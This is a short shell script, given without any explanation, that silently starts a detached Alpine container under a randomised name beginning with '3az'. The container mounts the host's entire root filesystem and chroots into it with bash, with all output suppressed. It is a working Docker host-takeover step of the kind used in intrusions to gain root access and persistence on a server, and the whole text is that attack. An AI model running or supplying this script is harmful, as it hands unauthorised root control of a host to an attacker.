docker container inspect 3az 2>/dev/null 1>/dev/null;
if [ $? -eq 1 ]; then
	name=$(ls /tmp | sort -R | tail -n 1 | egrep -o '[[:alnum:]]{7}' | head -n 1)
	2>/dev/null 1>/dev/null docker run -it -d -v /:/host --name 3az$name alpine chroot /host /bin/bash 
fi
